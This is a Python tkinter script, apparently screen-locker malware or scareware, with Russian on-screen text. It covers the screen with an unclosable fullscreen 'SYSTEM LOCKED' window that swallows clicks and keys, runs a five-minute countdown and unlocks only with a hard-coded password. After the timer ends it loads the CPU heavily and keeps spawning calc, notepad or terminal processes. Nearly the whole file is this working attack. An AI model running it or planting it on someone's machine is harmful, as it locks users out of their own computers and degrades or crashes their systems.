import tkinter as tk
import threading
import time
import os
import sys
import subprocess

class LockerWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("")
        self.root.geometry("800x500")
        self.root.configure(bg='black')
        
        # Полный экран поверх всех окон
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)
        
        # Блокировка мыши
        self.root.bind('<Button-1>', self.do_nothing)
        self.root.bind('<Button-2>', self.do_nothing)
        self.root.bind('<Button-3>', self.do_nothing)
        self.root.bind('<Key>', self.do_nothing)
        
        # Запрет закрытия
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        
        self.password = "swill2025"
        self.time_left = 300
        self.active = True
        
        self.create_ui()
        
        # Таймер в отдельном потоке
        t1 = threading.Thread(target=self.timer_loop)
        t1.daemon = True
        t1.start()
        
        # Нагрузка в отдельном потоке
        t2 = threading.Thread(target=self.load_loop)
        t2.daemon = True
        t2.start()
        
        self.root.mainloop()
    
    def do_nothing(self, event=None):
        pass
    
    def create_ui(self):
        # Заголовок
        tk.Label(self.root, text="СИСТЕМА ЗАБЛОКИРОВАНА", 
                font=("Arial", 32, "bold"), fg="red", bg="black").pack(pady=40)
        
        # Таймер
        self.timer_label = tk.Label(self.root, text="05:00", 
                                   font=("Arial", 60, "bold"), 
                                   fg="red", bg="black")
        self.timer_label.pack(pady=30)
        
        # Поле ввода
        self.entry = tk.Entry(self.root, font=("Arial", 24), 
                             fg="red", bg="black", 
                             insertbackground="red", width=25)
        self.entry.pack(pady=30)
        self.entry.focus_force()
        
        # Кнопка
        tk.Button(self.root, text="РАЗБЛОКИРОВАТЬ", 
                 font=("Arial", 20, "bold"), 
                 fg="red", bg="black", 
                 command=self.check_pass,
                 relief="solid", borderwidth=3).pack(pady=20)
        
        # Сообщение
        self.msg = tk.Label(self.root, text="", 
                           font=("Arial", 18), 
                           fg="red", bg="black")
        self.msg.pack(pady=10)
    
    def check_pass(self):
        if self.entry.get() == self.password:
            self.msg.config(text="ДОСТУП ОТКРЫТ", fg="green")
            self.root.after(500, self.exit_app)
        else:
            self.msg.config(text="НЕВЕРНЫЙ ПАРОЛЬ", fg="orange")
            self.entry.delete(0, tk.END)
            self.entry.focus_force()
    
    def exit_app(self):
        self.active = False
        self.root.destroy()
        sys.exit(0)
    
    def timer_loop(self):
        while self.time_left > 0 and self.active:
            mins = self.time_left // 60
            secs = self.time_left % 60
            self.timer_label.config(text=f"{mins:02d}:{secs:02d}")
            time.sleep(1)
            self.time_left -= 1
        
        if self.active and self.time_left == 0:
            self.timer_label.config(text="00:00", fg="orange")
            self.msg.config(text="ВРЕМЯ ВЫШЛО!", fg="orange")
    
    def load_loop(self):
        while self.time_left > 0 and self.active:
            time.sleep(0.5)
        
        if self.active and self.time_left == 0:
            # Нагрузка CPU
            while self.active:
                # Вычисления
                for i in range(10000000):
                    if not self.active:
                        break
                    x = i * i * i / (i + 1)
                
                # Открытие процессов
                if self.active:
                    try:
                        if sys.platform == "win32":
                            subprocess.Popen("calc", shell=True)
                            subprocess.Popen("notepad", shell=True)
                        else:
                            os.system("gnome-terminal &")
                    except:
                        pass
                    
                    # Дополнительная нагрузка
                    for j in range(5):
                        if not self.active:
                            break
                        _ = [k**2 for k in range(1000000)]
                    
                    time.sleep(0.1)

if __name__ == "__main__":
    LockerWindow()